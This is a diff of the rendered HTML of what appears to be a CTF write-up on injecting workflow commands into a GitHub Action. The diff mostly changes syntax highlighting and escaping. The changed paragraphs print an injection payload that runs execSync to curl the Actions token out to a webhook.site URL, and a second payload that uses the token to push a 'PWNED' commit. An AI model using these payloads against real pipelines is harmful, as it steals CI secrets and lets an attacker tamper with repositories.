-&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;yml&quot;&gt;
-      &lt;pre class=&quot;language-yml&quot;&gt;&lt;code class=&quot;language-yml&quot;&gt;if: ${{ steps.comment_log.outputs.COMMENT_ID }}&lt;/code&gt;&lt;/pre&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;yaml&quot;&gt;
+      &lt;pre class=&quot;language-yaml&quot;&gt;&lt;code class=&quot;language-yaml&quot;&gt;&lt;span class=&quot;token key atrule&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; $&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; steps.comment_log.outputs.COMMENT_ID &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
       &lt;/div&gt;
 &lt;p&gt;Back to the workflow file again, I noticed that if I wanted the next step to run, the commet&lt;em&gt;log needed to output the COMMENT&lt;/em&gt;ID, right? Note: &lt;em&gt;Not really, &lt;code class=&quot;language-text&quot;&gt;steps.comment_log.outputs.COMMENT_ID&lt;/code&gt; is actually just the value of the output from the comment_log step.&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;With that, I’m going to skip my painstaking redundant effort to try to get “COMMNET&lt;em&gt;BODY” to be the value of “COMMENT&lt;/em&gt;ID”.&lt;/p&gt;
@@ -224,10 +305,10 @@ with:
   &lt;/a&gt;
     &lt;/p&gt;
 &lt;p&gt;However, the GitHub token is masked, therefore we cannot just see it. Also, later on, I would realised the the token is only valid while the action is being run. Therefore, even if I could copy and token, it would be useless later.&lt;/p&gt;
-&lt;p&gt;I then used some website to recieve request, thinking that I could append the token as part of the URL, just to validate the token exists. My input: &lt;code class=&quot;language-text&quot;&gt;::set-output name=COMMENT_ID::true ;const execSync = require(&amp;#39;child_process&amp;#39;).execSync; code = execSync(&amp;#39;curl https://webhook.site/REDACTED?token=&amp;#39; + process.env[&amp;quot;INPUT_GITHUB-TOKEN&amp;quot;]);&lt;/code&gt;. I did the same for “ACTIONS&lt;em&gt;RUNTIME&lt;/em&gt;TOKEN”.&lt;/p&gt;
+&lt;p&gt;I then used some website to recieve request, thinking that I could append the token as part of the URL, just to validate the token exists. My input: &lt;code class=&quot;language-text&quot;&gt;::set-output name=COMMENT_ID::true ;const execSync = require(&apos;child_process&apos;).execSync; code = execSync(&apos;curl https://webhook.site/REDACTED?token=&apos; + process.env[&quot;INPUT_GITHUB-TOKEN&quot;]);&lt;/code&gt;. I did the same for “ACTIONS&lt;em&gt;RUNTIME&lt;/em&gt;TOKEN”.&lt;/p&gt;
 &lt;p&gt;After verifying that the token exists, all I had to do is to make a request using GitHub API with the token to commit to the “README.md” file. I spent quite a few time researching the API but the solution is below.&lt;/p&gt;
 &lt;h2&gt;My Solution&lt;/h2&gt;
-&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;::set-output name=COMMENT_ID::true ;const execSync = require(&amp;#39;child_process&amp;#39;).execSync; code = execSync(`curl -i --request PUT --url https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/contents/README.md --header &amp;#39;authorization: Bearer ${process.env[&amp;quot;INPUT_GITHUB-TOKEN&amp;quot;]}&amp;#39; --header &amp;#39;content-type: application/json&amp;#39; --data &amp;#39;{ &amp;quot;message&amp;quot;: &amp;quot;PWNED!!!!&amp;quot;, &amp;quot;content&amp;quot;: &amp;quot;V2UgYXJlIGluY3JlZGlibHkgc2VjdXJlISBCdXQgaWYgeW91IGRpc2FncmVlLCBwbGVhc2UgZmlsZSBhIFBSIDopCk5PUEUsIEkgRElTQUdSRUVFRSEh&amp;quot;, &amp;quot;sha&amp;quot;: &amp;quot;959c46eb0fbab9ab5b5bfb279ab6d70f720d1207&amp;quot; }&amp;#39; --fail`);&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;::set-output name=COMMENT_ID::true ;const execSync = require(&apos;child_process&apos;).execSync; code = execSync(`curl -i --request PUT --url https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/contents/README.md --header &apos;authorization: Bearer ${process.env[&quot;INPUT_GITHUB-TOKEN&quot;]}&apos; --header &apos;content-type: application/json&apos; --data &apos;{ &quot;message&quot;: &quot;PWNED!!!!&quot;, &quot;content&quot;: &quot;V2UgYXJlIGluY3JlZGlibHkgc2VjdXJlISBCdXQgaWYgeW91IGRpc2FncmVlLCBwbGVhc2UgZmlsZSBhIFBSIDopCk5PUEUsIEkgRElTQUdSRUVFRSEh&quot;, &quot;sha&quot;: &quot;959c46eb0fbab9ab5b5bfb279ab6d70f720d1207&quot; }&apos; --fail`);&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;
   &lt;a
     class=&quot;gatsby-resp-image-link&quot;
@@ -861,7 +942,7 @@ undefined4 &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;spa
 &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
       &lt;/div&gt;
 &lt;h3&gt;Something’s Going On (Unsolved)&lt;/h3&gt;
-&lt;h3&gt;What Time Is It? &lt;a href=&quot;Unsolved&quot;&gt;1&lt;/a&gt;&lt;/h3&gt;
+&lt;h3&gt;What Time Is It? [1] (Unsolved)&lt;/h3&gt;
 &lt;h3&gt;Suspicious Service (Unsolved)&lt;/h3&gt;
 &lt;p&gt;Using Ghidra, a free and open source reverse engineering tool. It was able to reconstruct some of the source code back, however we were not sure on how to go on from here.&lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;
